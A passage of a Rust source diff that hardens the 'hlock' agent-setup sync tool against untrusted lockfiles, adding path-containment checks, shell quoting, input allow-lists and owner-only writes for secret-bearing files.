@@ -16,8 +16,10 @@ use serde_json::{json, Value};
 
 use crate::capture::{host_port, locate_model, read_config, render_config, tree_digest};
 use crate::error::{Error, Result};
+use crate::fsutil;
 use crate::lockfile::{Lockfile, Native, Runtime};
-use crate::profiles::{probe_harness, probe_runtime, python_package_versions, run_capture, Ctx, HarnessProfile, Registry};
+use crate::process::{self, Limits};
+use crate::profiles::{probe_harness, probe_runtime, python_package_versions, Ctx, HarnessProfile, Registry};
 use crate::secrets;
 
 /// Where a sync materializes the setup.
@@ -318,6 +320,8 @@ pub(crate) struct Desired {
     pub values: BTreeMap<String, String>,
     /// The file carries secrets (so it's written for its owner only).
     pub has_secrets: bool,
+    /// Every secret placeholder the vendored file holds.
+    pub placeholders: BTreeSet<String>,
 }
 
 /// The file contents a `WriteConfig` would produce. With `env_ref`, secrets are
@@ -332,7 +336,7 @@ fn desired_config(vendored: &Path, format: &str, pointers: &[String], target: &P
     let secrets_from = if env_ref.is_some() { live } else { overlay(actual.clone(), live) };
     let mut all = BTreeSet::new();
     collect_placeholders(&desired, &mut all);
-    let mut d = Desired { doc: Value::Null, missing: BTreeSet::new(), values: BTreeMap::new(), has_secrets: !all.is_empty() };
+    let mut d = Desired { doc: Value::Null, missing: BTreeSet::new(), values: BTreeMap::new(), has_secrets: !all.is_empty(), placeholders: all.clone() };
     let produce = |sub: &Value, cur: Option<&Value>, d: &mut Desired| -> Value {
         let filled = fill(sub, cur, resolve, &mut d.missing);
         match env_ref {
@@ -427,6 +431,52 @@ fn expand(p: &str, root: &Path, t: &Ctx) -> PathBuf {
     t.expand(p, Some(root))
 }
 
+/// A step hlock won't do automatically because the lock asks for something unsafe: a
+/// manual step saying why. A lock may come from someone else (`hlock pull`).
+fn refused(id: String, kind: &str, title: String, why: String) -> Step {
+    Step { id, kind: kind.into(), title, status: "manual".into(), reason: format!("{why}; refusing to write it automatically"), ..Default::default() }
+}
+
+/// A lock's vendored path, when it's a relative path inside the lock's directory.
+fn vendored_path(lock_dir: &Path, rel: &str) -> Option<PathBuf> {
+    let p = lock_dir.join(rel);
+    (fsutil::safe_rel(rel) && fsutil::within(lock_dir, &p)).then_some(p)
+}
+
+/// Whether `p` is strictly under one of `dirs` (never one of them itself).
+fn under_any(p: &Path, dirs: &[PathBuf]) -> bool {
+    let real = fsutil::resolve(p);
+    dirs.iter().any(|d| {
+        let d = fsutil::resolve(d);
+        real.starts_with(&d) && real != d
+    })
+}
+
+/// A skill's `git+<url>@<commit>#path=<subpath>` source, split.
+fn split_git_source(src: &str) -> (&str, &str, &str) {
+    let (url_commit, sub) = src.split_once("#path=").unwrap_or((src, ""));
+    let (url, commit) = url_commit.rsplit_once('@').filter(|(u, _)| u.contains("://") || u.contains(':')).unwrap_or((url_commit, "HEAD"));
+    (url, commit, sub)
+}
+
+/// Why a skill's git source can't be fetched automatically, if it can't: the URL must
+/// be http(s), ssh or git (or `host:path`), the commit a hash or a plain ref, and the
+/// subpath relative and inside the clone.
+fn git_source_problem(url: &str, commit: &str, sub: &str) -> Option<String> {
+    let scheme_ok = ["https://", "http://", "ssh://", "git://"].iter().any(|s| url.starts_with(s));
+    let scp_ok = !url.contains("://") && !url.contains("::") && url.split_once(':').is_some_and(|(host, _)| !host.is_empty() && !host.contains('/'));
+    if url.starts_with('-') || url.chars().any(|c| c.is_control() || c.is_whitespace()) || !(scheme_ok || scp_ok) {
+        return Some(format!("refusing to fetch: {url:?} isn't an http(s), ssh or git URL"));
+    }
+    if !fsutil::plain_token(commit) {
+        return Some(format!("refusing to fetch: the commit {commit:?} isn't a hash or plain ref"));
+    }
+    if !sub.is_empty() && !fsutil::safe_rel(sub) {
+        return Some(format!("refusing to fetch: the path {sub:?} isn't relative to the repository"));
+    }
+    None
+}
+
 pub(crate) fn lock_dir_of(lock_path: &Path, ctx: &Ctx) -> PathBuf {
     match lock_path.parent().filter(|p| !p.as_os_str().is_empty()) {
         Some(p) if p.is_absolute() => p.to_path_buf(),
@@ -447,14 +497,24 @@ pub(crate) fn pretty(p: &Path, ctx: &Ctx) -> String {
 }
 
 pub(crate) fn shell_join(argv: &[String]) -> String {
-    argv.iter()
-        .map(|a| if a.chars().all(|c| c.is_ascii_alphanumeric() || "-_./:@=+".contains(c)) { a.clone() } else { format!("'{}'", a.replace('\'', "'\\''")) })
-        .collect::<Vec<_>>()
-        .join(" ")
+    fsutil::shell_join(argv)
 }
 
-/// The command that installs a package by method, or `None` for app/manual installs.
+/// Why a package name or version from a lock can't go into an install command, if it
+/// can't: each must be a [`fsutil::plain_token`] (no shell syntax, no leading `-`).
+pub(crate) fn install_values_problem(package: Option<&str>, version: Option<&str>) -> Option<String> {
+    [("package", package), ("version", version)]
+        .into_iter()
+        .find_map(|(what, v)| v.filter(|v| !fsutil::plain_token(v)).map(|v| format!("refusing to install: the {what} {v:?} has characters that aren't allowed (letters, digits and ._:/@+- only, not starting with '-')")))
+}
+
+/// The command that installs a package by method, or `None` for app/manual installs
+/// (and for a package or version that isn't a plain token). A script's `{version}` is
+/// substituted shell-quoted.
 pub(crate) fn install_command(method: &str, package: Option<&str>, version: Option<&str>, script: Option<&str>) -> Option<Vec<String>> {
+    if install_values_problem(package, version).is_some() {
+        return None;
+    }
     let v = |sep: &str| version.map(|v| format!("{sep}{v}")).unwrap_or_default();
     match (method, package) {
         ("npm", Some(p)) => Some(vec!["npm".into(), "install".into(), "-g".into(), format!("{p}{}", v("@"))]),
@@ -462,7 +522,7 @@ pub(crate) fn install_command(method: &str, package: Option<&str>, version: Opti
         ("brew-cask", Some(p)) => Some(vec!["brew".into(), "install".into(), "--cask".into(), p.into()]),
         ("uv-tool", Some(p)) => Some(vec!["uv".into(), "tool".into(), "install".into(), format!("{p}{}", v("=="))]),
         ("pip", Some(p)) => Some(vec!["python3".into(), "-m".into(), "pip".into(), "install".into(), format!("{p}{}", v("=="))]),
-        ("script", _) => script.map(|s| vec!["sh".into(), "-c".into(), s.replace("{version}", version.unwrap_or(""))]),
+        ("script", _) => script.map(|s| vec!["sh".into(), "-c".into(), s.replace("{version}", &version.map(fsutil::shell_quote).unwrap_or_default())]),
         _ => None,
     }
 }
@@ -485,6 +545,10 @@ fn parse_source(src: &str) -> (String, Option<String>) {
 
 fn install_step(id: String, kind: &str, what: &str, version: Option<&str>, source: Option<&str>, profile_install: &[crate::profiles::InstallMethod], opts: &SyncOptions, verify: Option<String>, ctx: &Ctx) -> Step {
     let (method, package) = source.map(parse_source).unwrap_or_default();
+    let vtxt = version.map(|v| format!(" {v}")).unwrap_or_default();
+    if let Some(why) = install_values_problem(package.as_deref(), version) {
+        return Step { id, kind: kind.into(), title: format!("Install {what}{vtxt}"), status: "manual".into(), reason: why, verify, ..Default::default() };
+    }
     let script = profile_install.iter().find(|m| m.method == "script").and_then(|m| m.command.clone());
     let manual_hint = profile_install.iter().find(|m| m.method == method || m.method == "app" || m.method == "manual").and_then(|m| m.command.clone());
     let mut argv = install_command(&method, package.as_deref(), version, script.as_deref());
@@ -492,7 +556,6 @@ fn install_step(id: String, kind: &str, what: &str, version: Option<&str>, sourc
         // the recorded method can't be scripted here; fall back to the profile's first scriptable one
         argv = profile_install.iter().find_map(|m| install_command(&m.method, m.package.as_deref(), version, m.command.as_deref()).filter(|a| ctx.which(&a[0]).is_some()));
     }
-    let vtxt = version.map(|v| format!(" {v}")).unwrap_or_default();
     let mut step = Step { id, kind: kind.into(), title: format!("Install {what}{vtxt}"), verify, ..Default::default() };
     match argv {
         Some(a) => {
@@ -568,7 +631,13 @@ pub fn plan(lock: &Lockfile, lock_path: &Path, reg: &Registry, ctx: &Ctx, opts: 
     // ---- plugins and packages ----
     let harness_env = isolation.clone();
     for n in &lock.native {
-        if let Some(s) = native_step(n, profile, &t, &root, harness_env.clone(), opts, ctx) {
+        if let Some(mut s) = native_step(n, profile, &t, &root, harness_env.clone(), opts, ctx) {
+            // a plugin runs code: from someone else's lock, install it only when asked
+            if lock.pulled.is_some() && !opts.install && s.status == "auto" {
+                s.status = "manual".into();
+                s.reason = "the lock was pulled from someone else; plugin installs run only with --install".into();
+                s.action = None;
+            }
             steps.push(s);
         }
     }
@@ -592,12 +661,15 @@ pub fn plan(lock: &Lockfile, lock_path: &Path, reg: &Registry, ctx: &Ctx, opts: 
             }
             continue;
         };
-        let vendored = lock_dir.join(vend);
+        let Some(vendored) = vendored_path(&lock_dir, vend) else {
+            steps.push(refused(format!("config:{}", c.id), "config", format!("Restore {}", c.path), format!("its vendored copy {vend:?} isn't a path inside the lock's directory")));
+            continue;
+        };
         let fallback = (mode == "prefix").then(|| profile.file_path(&c.id, ctx)).flatten();
         let env_ref = opts.inject.then(|| profile.files.get(&c.id).and_then(|f| f.env_ref.clone())).flatten();
         let resolve = resolver(ctx);
-        let Desired { doc: desired, missing, .. } = desired_config(&vendored, &c.format, &c.pointers, &target, fallback.as_deref(), &resolve, env_ref.as_deref())?;
-        collect_placeholders(&read_config(&vendored, if c.pointers.is_empty() && c.format != "jsonc" { &c.format } else { "json" })?.unwrap_or_default(), &mut all_secrets);
+        let Desired { doc: desired, missing, placeholders, .. } = desired_config(&vendored, &c.format, &c.pointers, &target, fallback.as_deref(), &resolve, env_ref.as_deref())?;
+        all_secrets.extend(placeholders);
         missing_secrets.extend(missing.iter().cloned());
         // hlock's decider hooks are written by their own step, so they aren't drift here
         let actual = read_config(&target, &c.format).ok().flatten().map(|mut a| {
@@ -624,18 +696,28 @@ pub fn plan(lock: &Lockfile, lock_path: &Path, reg: &Registry, ctx: &Ctx, opts: 
 
     // ---- skills ----
     let write_dir = profile.skills.write.as_ref().map(|w| expand(w, &root, &t));
+    // where a lock may put a skill: under the harness's skill directories
+    let skill_dirs: Vec<PathBuf> = write_dir.iter().cloned().chain(profile.skills.dirs.iter().map(|d| expand(d, &root, &t))).collect();
     let mut locked_skill_dirs = BTreeSet::new();
     for s in &lock.skill {
         if matches!(s.origin.as_str(), "harness-builtin" | "bundled") {
             continue; // provided by the harness / its plugins
         }
         let Some(path) = &s.path else { continue };
+        if !fsutil::plain_name(&s.name) {
+            steps.push(refused(format!("skill:{}", s.name), "skill", format!("Skill {:?}", s.name), "its name isn't a plain directory name".into()));
+            continue;
+        }
         let mut dest = expand(path, &root, &t);
         let outside_root = !path.starts_with("{root}") && (path.starts_with('~') || Path::new(path).is_absolute());
         if mode != "home" && outside_root {
             if let Some(w) = &write_dir {
                 dest = w.join(&s.name);
             }
+        }
+        if !under_any(&dest, &skill_dirs) {
+            steps.push(refused(format!("skill:{}", s.name), "skill", format!("Skill {} → {}", s.name, pretty(&dest, ctx)), format!("{path} is outside {}'s skill directories", profile.name)));
+            continue;
         }
         locked_skill_dirs.insert(dest.clone());
         let ok = dest.join("SKILL.md").is_file() && Some(tree_digest(&dest)) == s.digest;
@@ -644,18 +726,34 @@ pub fn plan(lock: &Lockfile, lock_path: &Path, reg: &Registry, ctx: &Ctx, opts: 
         if ok {
             step.reason = "matches the lock".into();
         } else if let Some(v) = &s.vendored {
-            step.status = "auto".into();
-            step.title = format!("Copy skill {} → {shown}", s.name);
-            step.action = Some(Action::CopyDir { from: lock_dir.join(v), to: dest });
+            match vendored_path(&lock_dir, v) {
+                Some(from) => {
+                    step.status = "auto".into();
+                    step.title = format!("Copy skill {} → {shown}", s.name);
+                    step.action = Some(Action::CopyDir { from, to: dest });
+                }
+                None => {
+                    step.status = "manual".into();
+                    step.reason = format!("its vendored copy {v:?} isn't a path inside the lock's directory; refusing to copy it");
+                }
+            }
         } else if let Some(src) = s.source.as_deref().and_then(|x| x.strip_prefix("git+")) {
-            let (url_commit, sub) = src.split_once("#path=").unwrap_or((src, ""));
-            let (url, commit) = url_commit.rsplit_once('@').unwrap_or((url_commit, "HEAD"));
+            let (url, commit, sub) = split_git_source(src);
             let has_git = ctx.which("git").is_some();
-            step.status = if has_git { "auto" } else { "manual" }.into();
-            step.title = format!("Fetch skill {} from {url}@{}", s.name, &commit[..commit.len().min(10)]);
-            step.reason = if has_git { String::new() } else { "needs git".into() };
-            step.command = Some(format!("git clone {url} && git -C <clone> checkout {commit}  # then copy {sub}"));
-            step.action = has_git.then(|| Action::GitSkill { url: url.into(), commit: commit.into(), subpath: sub.into(), to: dest });
+            step.title = format!("Fetch skill {} from {url}@{}", s.name, fsutil::prefix_chars(commit, 10));
+            step.command = Some(format!("git clone -- {} <clone> && git -C <clone> checkout {}  # then copy {}", fsutil::shell_quote(url), fsutil::shell_quote(commit), fsutil::shell_quote(sub)));
+            match git_source_problem(url, commit, sub) {
+                Some(why) => {
+                    step.status = "manual".into();
+                    step.reason = why;
+                    step.command = None;
+                }
+                None => {
+                    step.status = if has_git { "auto" } else { "manual" }.into();
+                    step.reason = if has_git { String::new() } else { "needs git".into() };
+                    step.action = has_git.then(|| Action::GitSkill { url: url.into(), commit: commit.into(), subpath: sub.into(), to: dest });
+                }
+            }
         } else {
             step.status = "manual".into();
             step.reason = if s.origin == "first-party" { "project skill missing or changed; it comes from the repo".into() } else { "no vendored copy or source to fetch it from".into() };
@@ -682,16 +780,31 @@ pub fn plan(lock: &Lockfile, lock_path: &Path, reg: &Registry, ctx: &Ctx, opts: 
     }
 
     // ---- instructions ----
+    // where a lock may put an instruction file: exactly where the harness reads them
+    let instruction_files: Vec<PathBuf> = profile.instructions.iter().map(|tpl| fsutil::normalize(&expand(tpl, &root, &t))).collect();
     for i in &lock.instructions {
         let dest = expand(&i.name, &root, &t);
+        let id = format!("instructions:{}", i.name);
+        if !instruction_files.contains(&fsutil::normalize(&dest)) {
+            steps.push(refused(id, "instructions", format!("Write {}", pretty(&dest, ctx)), format!("{} isn't a file {} reads instructions from", i.name, profile.name)));
+            continue;
+        }
         let ok = std::fs::read(&dest).map(|b| Some(crate::hash::sha256_bytes(&b)) == i.digest).unwrap_or(false);
-        let mut step = Step { id: format!("instructions:{}", i.name), kind: "instructions".into(), title: pretty(&dest, ctx), ..Default::default() };
+        let mut step = Step { id, kind: "instructions".into(), title: pretty(&dest, ctx), ..Default::default() };
         if ok {
             step.reason = "matches the lock".into();
         } else if let Some(v) = &i.vendored {
-            step.status = "auto".into();
-            step.title = format!("Write {}", pretty(&dest, ctx));
-            step.action = Some(Action::CopyFile { from: lock_dir.join(v), to: dest });
+            match vendored_path(&lock_dir, v) {
+                Some(from) => {
+                    step.status = "auto".into();
+                    step.title = format!("Write {}", pretty(&dest, ctx));
+                    step.action = Some(Action::CopyFile { from, to: dest });
+                }
+                None => {
+                    step.status = "manual".into();
+                    step.reason = format!("its vendored copy {v:?} isn't a path inside the lock's directory; refusing to copy it");
+                }
+            }
         } else {
             step.status = "manual".into();
             step.optional = true;
@@ -738,7 +851,7 @@ pub fn plan(lock: &Lockfile, lock_path: &Path, reg: &Registry, ctx: &Ctx, opts: 
     }
 
     // ---- deciders: hooks, keys, local models ----
-    steps.extend(decider_steps(lock, lock_path, profile, &t, ctx, opts, &sync_cmd));
+    steps.extend(decider_steps(lock, lock_path, profile, reg, &t, ctx, opts, &sync_cmd));
 
     // ---- secrets ----
     for r in &lock.secret {
@@ -783,7 +896,8 @@ pub fn plan(lock: &Lockfile, lock_path: &Path, reg: &Registry, ctx: &Ctx, opts: 
 
 /// Steps for a lock's deciders: write the hooks hlock wires them in with (and remove
 /// stale ones), and check each one's API key or local model.
-fn decider_steps(lock: &Lockfile, lock_path: &Path, profile: &HarnessProfile, t: &Ctx, ctx: &Ctx, opts: &SyncOptions, sync_cmd: &str) -> Vec<Step> {
+#[allow(clippy::too_many_arguments)]
+fn decider_steps(lock: &Lockfile, lock_path: &Path, profile: &HarnessProfile, reg: &Registry, t: &Ctx, ctx: &Ctx, opts: &SyncOptions, sync_cmd: &str) -> Vec<Step> {
     let mut steps = Vec::new();
     let bin = ctx.var("HLOCK_BIN").unwrap_or("hlock").to_string();
     let lock_abs = if lock_path.is_absolute() { lock_path.to_path_buf() } else { ctx.cwd.join(lock_path) };
@@ -804,6 +918,11 @@ fn decider_steps(lock: &Lockfile, lock_path: &Path, profile: &HarnessProfile, t:
         let uses: BTreeSet<&str> = lock.decider.iter().filter(|d| d.via == "hook" && d.wiring.iter().any(|w| w.file == target)).map(|d| d.use_.as_str()).collect();
         let shown = pretty(&path, ctx);
         let wire = |what: &str| format!("Wire deciders ({}) into {what}", uses.iter().copied().collect::<Vec<_>>().join(", "));
+        // wiring hlock won't write: a use or event that isn't one a hook answers
+        let problems = crate::decide::hook_problems(lock, &target, &h.format);
+        if !problems.is_empty() {
+            steps.push(refused(format!("decider-skip:{target}"), "decider", format!("Deciders hlock can't wire into {shown}"), problems.join("; ")));
+        }
         if h.owned() {
             // a file hlock owns: a plugin, or Copilot's hook file
             let desired = crate::decide::owned_hook_file(lock, &target, &h.format, &bin, &lock_abs);
@@ -868,8 +987,9 @@ fn decider_steps(lock: &Lockfile, lock_path: &Path, profile: &HarnessProfile, t:
     // the API key each hosted decider needs, once per variable
     let mut keys: BTreeMap<String, Vec<String>> = BTreeMap::new();
     for d in lock.decider.iter().filter(|d| d.runtime.is_none() && crate::decide::needs_key(&d.provider)) {
-        if let Some(k) = &d.key_env {
-            keys.entry(k.clone()).or_default().push(format!("{} ({}:{})", d.use_, d.provider, d.model));
+        // the provider's own variable: a lock's `key-env` isn't trusted (decide::entry_config)
+        if let Some(k) = crate::decide::entry_key_env(d, crate::decide::own_spec(&ctx.cwd, &d.use_).as_ref()) {
+            keys.entry(k).or_default().push(format!("{} ({}:{})", d.use_, d.provider, d.model));
         }
     }
     for (k, users) in keys {
@@ -885,29 +1005,50 @@ fn decider_steps(lock: &Lockfile, lock_path: &Path, profile: &HarnessProfile, t:
         });
     }
     for d in &lock.decider {
-        if let Some(rt) = &d.runtime {
-            let cfg = crate::decide::entry_config(d);
-            let present = cfg.endpoint(&var).ok().is_some_and(|ep| {
-                let url = format!("{}/api/tags", ep.base_url.trim_end_matches('/'));
-                let agent: ureq::Agent = ureq::Agent::config_builder().timeout_global(Some(Duration::from_millis(500))).build().into();
-                agent.get(&url).call().ok().and_then(|mut r| r.body_mut().read_to_string().ok()).is_some_and(|t| {
-                    serde_json::from_str::<Value>(&t).ok().is_some_and(|v| {
-                        v["models"].as_array().into_iter().flatten().any(|m| m["name"].as_str().is_some_and(|n| n == d.model || n.trim_end_matches(":latest") == d.model))
-                    })
-                })
-            });
-            let argv = vec![rt.clone(), "pull".to_string(), d.model.clone()];
-            steps.push(Step {
-                id: format!("decider-model:{}", d.use_),
-                kind: "model".into(),
-                title: format!("{} on {rt} (the {} decider)", d.model, d.use_),
-                status: if present { "satisfied" } else if opts.pull { "auto" } else { "manual" }.into(),
-                reason: if present { "pulled and served".into() } else { format!("not served by a running {rt}") },
-                action: (!present && opts.pull).then(|| Action::Run { argv: argv.clone(), env: BTreeMap::new() }),
-                command: (!present).then(|| argv.join(" ")),
-                ..Default::default()
-            });
+        let Some(rt) = &d.runtime else { continue };
+        let id = format!("decider-model:{}", d.use_);
+        let title = format!("{} on {rt} (the {} decider)", d.model, d.use_);
+        // only a runtime hlock knows serves deciders, through its own pull command
+        let Some(rp) = reg.runtime(rt).filter(|p| crate::decide::provider(&p.id).is_some_and(|x| x.5.runtime)) else {
+            steps.push(refused(id, "model", title, format!("{rt:?} isn't a local runtime hlock knows")));
+            continue;
+        };
+        if !fsutil::plain_token(&d.model) {
+            steps.push(refused(id, "model", title, format!("the model {:?} has characters that aren't allowed", d.model)));
+            continue;
         }
+        let cfg = crate::decide::entry_config(d);
+        // ask only a server on this machine, or the one this machine's environment names
+        let here = |ep: &crate::decide::Endpoint| {
+            crate::decide::is_loopback(&ep.base_url) || crate::decide::provider(&d.provider).and_then(|p| var(p.3)).is_some_and(|u| ep.base_url.trim_end_matches('/') == u.trim_end_matches('/'))
+        };
+        let present = cfg.endpoint(&var).ok().filter(here).is_some_and(|ep| {
+            let url = format!("{}/api/tags", ep.base_url.trim_end_matches('/'));
+            let agent: ureq::Agent = ureq::Agent::config_builder().timeout_global(Some(Duration::from_millis(500))).build().into();
+            agent.get(&url).call().ok().and_then(|mut r| r.body_mut().read_to_string().ok()).is_some_and(|t| {
+                serde_json::from_str::<Value>(&t).ok().is_some_and(|v| {
+                    v["models"].as_array().into_iter().flatten().any(|m| m["name"].as_str().is_some_and(|n| n == d.model || n.trim_end_matches(":latest") == d.model))
+                })
+            })
+        });
+        // the profile's pull command (`ollama pull {model}`), one word per argument
+        let argv: Option<Vec<String>> = rp.pull.as_ref().map(|p| p.split_whitespace().map(|w| if w == "{model}" { d.model.clone() } else { w.to_string() }).collect());
+        let Some(argv) = argv.filter(|a| !a.is_empty() && !a.iter().any(|w| w.starts_with('{'))) else {
+            steps.push(refused(id, "model", title, format!("{} has no pull command for it", rp.name)));
+            continue;
+        };
+        let can = ctx.which(&argv[0]).is_some();
+        let auto = !present && opts.pull && can;
+        steps.push(Step {
+            id,
+            kind: "model".into(),
+            title,
+            status: if present { "satisfied" } else if auto { "auto" } else { "manual" }.into(),
+            reason: if present { "pulled and served".into() } else if can { format!("not served by a running {rt}") } else { format!("needs `{}`, which isn't on PATH", argv[0]) },
+            action: auto.then(|| Action::Run { argv: argv.clone(), env: BTreeMap::new() }),
+            command: (!present).then(|| shell_join(&argv)),
+            ..Default::default()
+        });
     }
     steps
 }
@@ -954,6 +1095,10 @@ fn native_step(n: &Native, profile: &HarnessProfile, t: &Ctx, root: &Path, env: 
     let have_bin = ctx.which(&bin).is_some();
     let mut s = Step { id: format!("{}:{}", n.kind, n.name), kind: "plugin".into(), ..Default::default() };
     let vtxt = n.version.as_deref().map(|v| format!(" {v}")).unwrap_or_default();
+    // names and sources become arguments of an install command: never an option
+    if let Some(bad) = [Some(n.name.as_str()), n.source.as_deref(), n.version.as_deref()].into_iter().flatten().find(|v| v.is_empty() || v.starts_with('-') || v.chars().any(char::is_control)) {
+        return Some(refused(s.id, "plugin", format!("{} {}{vtxt}", n.kind, n.name), format!("{bad:?} isn't a name, version or source hlock passes to an installer")));
+    }
     match (profile.id.as_str(), kind) {
         ("claude-code", "marketplace") => {
             let known = read_config(&root.join("plugins/known_marketplaces.json"), "json").ok().flatten().unwrap_or_default();
@@ -1018,6 +1163,9 @@ fn native_step(n: &Native, profile: &HarnessProfile, t: &Ctx, root: &Path, env: 
                 s.reason = "installed".into();
                 return Some(s);
             }
+            if let Some(why) = install_values_problem(Some(pkg), n.version.as_deref()) {
+                return Some(refused(s.id, "package", s.title, why));
+            }
             let spec = format!("{pkg}{}", n.version.as_deref().map(|v| format!("=={v}")).unwrap_or_default());
             let argv = if ctx.which("uv").is_some() { vec!["uv".into(), "pip".into(), "install".into(), spec] } else { vec!["python3".into(), "-m".into(), "pip".into(), "install".into(), spec] };
             s.title = format!("Install Python package {pkg}{vtxt}");
@@ -1054,7 +1202,7 @@ fn runtime_steps(rt: &Runtime, used: &BTreeSet<(String, String)>, reg: &Registry
                 if docker { "reached from the container via host.docker.internal; a host" } else { "a self-hosted" },
                 if models.is_empty() { "(no models listed)".to_string() } else { models.join(", ") }
             ),
-            verify: (!endpoint.is_empty()).then(|| format!("curl -s {}/models", endpoint.trim_end_matches('/'))),
+            verify: (!endpoint.is_empty()).then(|| format!("curl -s {}", fsutil::shell_quote(&format!("{}/models", endpoint.trim_end_matches('/'))))),
             optional: !rt.model.iter().any(|m| is_used(&m.id)),
             ..Default::default()
         });
@@ -1081,10 +1229,17 @@ fn runtime_steps(rt: &Runtime, used: &BTreeSet<(String, String)>, reg: &Registry
             s.reason = "on disk".into();
         } else {
             let repo = m.source.as_deref().and_then(|x| x.strip_prefix("hf://")).unwrap_or(&m.id);
-            let cmd = profile.pull.as_ref().map(|p| {
-                p.replace("{model}", &m.id).replace("{repo}", repo).replace("{revision}", m.revision.as_deref().unwrap_or("main")).replace(" {file}", "")
-            });
+            let revision = m.revision.as_deref().unwrap_or("main");
             s.title = format!("Pull {} model {}{size}", profile.name, m.id);
+            // each value goes into `sh -c`: a plain token, quoted
+            if let Some((what, v)) = [("model", m.id.as_str()), ("repo", repo), ("revision", revision)].into_iter().find(|(_, v)| !fsutil::plain_token(v)) {
+                s.status = "manual".into();
+                s.reason = format!("refusing to pull: the {what} {v:?} has characters that aren't allowed");
+                out.push(s);
+                continue;
+            }
+            let q = fsutil::shell_quote;
+            let cmd = profile.pull.as_ref().map(|p| p.replace("{model}", &q(&m.id)).replace("{repo}", &q(repo)).replace("{revision}", &q(revision)).replace(" {file}", ""));
             s.command = cmd.clone();
             s.verify = (bin == "ollama").then(|| "ollama list".to_string());
             let can = cmd.is_some() && probe.installed;
@@ -1128,17 +1283,56 @@ fn backup(path: &Path) -> Result<Option<PathBuf>> {
     Ok(Some(bak))
 }
 
+/// Copy a directory tree without following symlinks ([`fsutil::copy_tree`]).
 pub(crate) fn copy_tree(from: &Path, to: &Path) -> Result<()> {
-    std::fs::create_dir_all(to)?;
-    for e in std::fs::read_dir(from)?.flatten() {
-        let (src, dst) = (e.path(), to.join(e.file_name()));
-        if src.is_dir() {
-            copy_tree(&src, &dst)?;
-        } else {
-            std::fs::copy(&src, &dst)?;
+    fsutil::copy_tree(from, to).map(|_| ())
+}
+
+/// The most of an instruction file hlock copies.
+const MAX_INSTRUCTIONS: usize = 10 * 1024 * 1024;
+
+/// How long an installer or a model download may take.
+const RUN_TIMEOUT: Duration = Duration::from_secs(4 * 3600);
+
+/// A directory of its own under the system temp dir, removed when dropped (on every
+/// path, errors included).
+struct TempDir(PathBuf);
+
+impl TempDir {
+    fn new(tag: &str) -> Result<TempDir> {
+        use std::sync::atomic::{AtomicU64, Ordering};
+        static N: AtomicU64 = AtomicU64::new(0);
+        let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.subsec_nanos()).unwrap_or(0);
+        for _ in 0..16 {
+            let p = std::env::temp_dir().join(format!("hlock-{tag}-{}-{nanos}-{}", std::process::id(), N.fetch_add(1, Ordering::Relaxed)));
+            // create_dir fails when it exists: never reuse a directory someone else made
+            match std::fs::create_dir(&p) {
+                Ok(()) => return Ok(TempDir(p)),
+                Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
+                Err(e) => return Err(e.into()),
+            }
         }
+        Err(Error::Profile("can't create a temporary directory".into()))
     }
-    Ok(())
+}
+
+impl Drop for TempDir {
+    fn drop(&mut self) {
+        let _ = std::fs::remove_dir_all(&self.0);
+    }
+}
+
+/// Run git with the context's environment, never prompting, and fail on a non-zero exit.
+fn git(git: &Path, args: &[&str], ctx: &Ctx) -> Result<String> {
+    let mut cmd = std::process::Command::new(git);
+    cmd.args(args).current_dir(&ctx.cwd).env_clear().envs(&ctx.env).env("GIT_TERMINAL_PROMPT", "0").stdin(std::process::Stdio::null());
+    let out = process::run(cmd, &Limits::timeout(Duration::from_secs(600))).map_err(|e| Error::Profile(format!("cannot run git: {e}")))?;
+    if out.success {
+        Ok(out.stdout_text())
+    } else {
+        let why = if out.timed_out { "timed out".to_string() } else { out.stderr_text().trim().lines().last().unwrap_or("failed").to_string() };
+        Err(Error::Profile(format!("git {} failed: {why}", args.iter().find(|a| !a.starts_with('-')).unwrap_or(&""))))
+    }
 }
 
 /// Perform one `auto` step and describe what happened.
@@ -1151,26 +1345,23 @@ pub fn run_step(step: &Step, ctx: &Ctx) -> Result<String> {
             let missing = d.missing;
             let fmt = if format == "jsonc" { "json" } else { format.as_str() };
             let text = render_config(&d.doc, fmt).map_err(Error::Profile)?;
-            if let Some(parent) = path.parent() {
-                std::fs::create_dir_all(parent)?;
-            }
             let b = PathBuf::from(format!("{}.hlock-bak", path.display()));
             if env_ref.is_some() {
                 // an isolated root is restored from the lock; a backup would only keep old values on disk
                 let _ = std::fs::remove_file(&b);
             }
-            let bak = if path.exists() && env_ref.is_none() {
-                std::fs::copy(path, &b)?;
-                if d.has_secrets {
-                    secrets::restrict(&b)?;
-                }
+            // the old file may hold secrets: its backup is the owner's only, from the start
+            let bak = if env_ref.is_none() && std::fs::symlink_metadata(path).is_ok_and(|m| m.is_file()) {
+                fsutil::clear_symlink(&b)?;
+                fsutil::copy_private(path, &b)?;
                 Some(b)
             } else {
                 None
             };
-            std::fs::write(path, text)?;
             if d.has_secrets {
-                secrets::restrict(path)?; // it may hold secret values: owner only
+                fsutil::write_private(path, text)?; // it may hold secret values: owner only
+            } else {
+                fsutil::write_atomic(path, text)?;
             }
             let mut msg = format!("wrote {}", path.display());
             if let Some(b) = bak {
@@ -1182,7 +1373,7 @@ pub fn run_step(step: &Step, ctx: &Ctx) -> Result<String> {
             Ok(msg)
         }
         Action::CopyDir { from, to } => {
-            if !from.is_dir() {
+            if !std::fs::symlink_metadata(from).is_ok_and(|m| m.is_dir()) {
                 return Err(Error::Lockfile(format!("vendored copy missing: {}", from.display())));
             }
             let bak = backup(to)?;
@@ -1193,49 +1384,60 @@ pub fn run_step(step: &Step, ctx: &Ctx) -> Result<String> {
             })
         }
         Action::CopyFile { from, to } => {
-            if let Some(parent) = to.parent() {
-                std::fs::create_dir_all(parent)?;
+            let data = fsutil::read_regular(from, MAX_INSTRUCTIONS).map_err(|e| Error::Lockfile(format!("vendored copy {}: {e}", from.display())))?;
+            if std::fs::symlink_metadata(to).is_ok_and(|m| m.is_file()) {
+                let b = PathBuf::from(format!("{}.hlock-bak", to.display()));
+                fsutil::clear_symlink(&b)?;
+                std::fs::copy(to, &b)?;
             }
-            if to.exists() {
-                std::fs::copy(to, format!("{}.hlock-bak", to.display()))?;
-            }
-            std::fs::copy(from, to)?;
+            fsutil::write_atomic(to, data)?;
             Ok(format!("wrote {}", to.display()))
         }
         Action::GitSkill { url, commit, subpath, to } => {
-            let git = ctx.which("git").ok_or_else(|| Error::Profile("git isn't on PATH".into()))?;
